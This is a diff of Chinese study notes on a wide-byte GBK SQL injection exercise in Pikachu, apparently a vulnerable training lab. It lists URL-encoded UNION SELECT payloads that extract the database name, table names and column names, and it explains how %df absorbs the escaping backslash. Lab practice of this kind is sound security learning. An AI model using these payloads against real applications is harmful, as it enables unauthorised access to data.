@@ -1,9 +1,12 @@
-Pikachu-宽字节注入-源代码为GBK编码转义
+Pikachu-宽字节注入-源代码为GBK编码转义          （burp suite抓包完成）
 爆库名
-1%df%27 union select 1,database()-- 
+1%df%27 union select 1,database()--       #应为'被转义 /为%5c，%df%5c为一个繁体字運,吃掉了/，%27为'
+相当于执行语句为： 1運' union select 1,database()-- 
 爆表名
 1%df%27 union select 1,group_concat(table_name)from information_schema.tables where table_schema=0x70696b61636875--                     
-#'pikachu'被转义，尝试%df%27pikachu%df%27发现不行,原来的语句为select id,email from member where username='$name'   如果后面用%df%27就会变成    %df%5c%27pikachu%df%5c%27=运'pikachu运' SQL语法错误，就直接用十六进制
+
+#'pikachu'被转义，尝试%df%27pikachu%df%27发现不行,原来的语句为select id,email from member where username='$name'  
+如果后面用%df%27就会变成    %df%5c%27pikachu%df%5c%27=運'pikachu運' SQL语法错误，就直接用十六进制
 爆列名
 1%df%27 union select 1,group_concat(column_name)from information_schema.columns where table_name=0x7573657273-- 
 爆内容
